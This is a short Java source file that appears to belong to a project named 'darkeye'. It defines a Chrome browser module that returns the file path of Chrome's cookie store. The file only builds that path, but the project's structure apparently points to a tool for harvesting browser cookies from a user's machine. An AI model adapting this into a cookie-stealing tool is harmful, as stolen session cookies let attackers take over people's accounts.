package org.spray.darkeye.module.browsers;

import org.spray.darkeye.module.BrowserModule;

public class ChromeBrowser extends BrowserModule {

	public ChromeBrowser() {
		super("Chrome");
	}

	@Override
	public String getCookie() {
		return System.getenv("APPDATA") + "/Local/Google/Chrome/User Data/Default/Cookie";
	}

}
